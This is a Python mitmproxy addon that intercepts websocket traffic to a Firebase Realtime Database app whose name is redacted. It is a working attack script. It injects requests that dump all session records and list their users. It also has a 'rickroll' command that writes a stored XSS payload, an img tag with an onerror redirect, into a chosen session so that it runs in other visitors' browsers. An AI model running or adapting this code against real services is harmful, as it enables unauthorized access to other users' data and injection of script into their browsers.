import logging
import re
import typing
import json

from mitmproxy import http
from mitmproxy import ctx
from mitmproxy import command
from mitmproxy import flow

def websocket_message(flow: http.HTTPFlow):
    if flow.websocket is None or not flow.request.host.endswith(".firebasedatabase.app"):
        return

    message = flow.websocket.messages[-1]

    if message.from_client:
        ctx.log.info(f"Client sent a message: {message.content!r}")

        index_REDACTED_number = message.content.decode().find('"p":"/REDACTED/')
        if index_REDACTED_number != -1:
            flow.metadata["REDACTED_number"] = message.content.decode()[index_REDACTED_number+15:index_REDACTED_number+18]
    else:
        ctx.log.info(f"Server sent a message: {message.content!r}")

@command.command("dump_sessions")
def dump_sessions(flows: typing.Sequence[flow.Flow]):
    for flow in flows:
        if flow.websocket is None or not flow.live or not flow.request.host.endswith(".firebasedatabase.app"):
            continue
        if not "dump_sent" in flow.metadata and "REDACTED_number" in flow.metadata:
            payload = '{"t":"d","d":{"r":13,"a":"g","b":{"p":"/REDACTED/%s","q":{}}}}' % flow.metadata["REDACTED_number"]
            ctx.master.commands.call("inject.websocket", flow, False, payload.encode())
            flow.metadata["dump_sent"] = True

@command.command("write_sessions")
def write_sessions(flows: typing.Sequence[flow.Flow]):
    for flow in flows:
        if flow.websocket is None or not flow.live or not flow.request.host.endswith(".firebasedatabase.app"):
            continue
        sessions_dump = ""
        i = 0
        while not flow.websocket.messages[i].content.decode().endswith('","q":{}}}}'):
            i += 1
            if i == len(flow.websocket.messages):
                break
        if i == len(flow.websocket.messages):
            continue
        lenght_resp = int(flow.websocket.messages[i+1].content.decode())
        reassembled_resp = [m.content.decode() for m in flow.websocket.messages[i+2:i+2+lenght_resp]]
        sessions_dump = ''.join(reassembled_resp)
        with open("REDACTED_sessions.txt", "w") as f:
            f.write(sessions_dump)
        ctx.log.info("Sessions written to REDACTED_sessions.txt")

@command.command("list_sessions")
def list_sessions():
    with open('REDACTED_sessions.txt', 'r') as f:
        l=f.readline()
        j=json.loads(l)
        for a in j['d']['b']['d']:
            ctx.log.info("{} : {} users".format(j['d']['b']['d'][a], j['d']['b']['d'][a]['_users']))

@command.command("rickroll")
def rickroll(sessionid: str, flows: typing.Sequence[flow.Flow]):
    for flow in flows:
        if flow.websocket is None or not flow.live or not flow.request.host.endswith(".firebasedatabase.app"):
            continue
        payload = '{"t":"d","d":{"r":5,"a":"p","b":{"p":"/REDACTED/%s/%s/rickroll","d":{"20":"<img src=\\"\\" onerror=\\"window.location.href=\'https://www.youtube.com/watch?v=dQw4w9WgXcQ\';\\">"}}}}' % (flow.metadata["REDACTED_number"], sessionid)
        ctx.master.commands.call("inject.websocket", flow, False, payload.encode())

